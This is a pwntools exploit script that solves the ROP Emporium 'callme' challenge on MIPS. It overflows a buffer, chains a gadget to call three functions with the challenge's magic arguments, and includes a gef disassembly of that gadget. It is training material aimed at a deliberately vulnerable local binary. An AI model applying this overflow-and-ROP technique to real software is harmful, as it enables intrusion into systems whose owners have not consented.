from pwn import *

exe = ELF('./callme_mipsel')
context.binary = exe
context.log_level = 'info'

libc = ELF('./callme_mipsel')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(['qemu-mipsel', '-L', '/usr/mipsel-linux-gnu', './callme_mipsel'])

offset = 36 #pattern search $ra

callme1 = exe.plt['callme_one']
callme2 = exe.plt['callme_two']
callme3 = exe.plt['callme_three']

usefulGadgets = 0x00400bb0 

callme_one_arg = 0xdeadbeef
callme_two_arg = 0xcafebabe
callme_three_arg = 0xd00df00d

payload = flat({offset:[usefulGadgets,
                        0,
                        callme1,
                        callme_three_arg,
                        callme_two_arg,
                        callme_one_arg,
                        usefulGadgets,
                        0,
                        callme2,
                        callme_three_arg,
                        callme_two_arg,
                        callme_one_arg,
                        usefulGadgets,
                        0,
                        callme3,
                        callme_three_arg,
                        callme_two_arg,
                        callme_one_arg]})

io.sendline(payload)

io.interactive()


'''

(remote) gef➤  disas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x00400bb0 <+0>:	lw	a0,16(sp)
   0x00400bb4 <+4>:	lw	a1,12(sp)
   0x00400bb8 <+8>:	lw	a2,8(sp)
   0x00400bbc <+12>:	lw	t9,4(sp)
   0x00400bc0 <+16>:	jalr	t9
   0x00400bc4 <+20>:	nop
   0x00400bc8 <+24>:	lw	ra,20(sp)
   0x00400bcc <+28>:	jr	ra
   0x00400bd0 <+32>:	addi	sp,sp,24
   0x00400bd4 <+36>:	nop
   0x00400bd8 <+40>:	nop
   0x00400bdc <+44>:	nop
End of assembler dump.
(remote) gef➤  

'''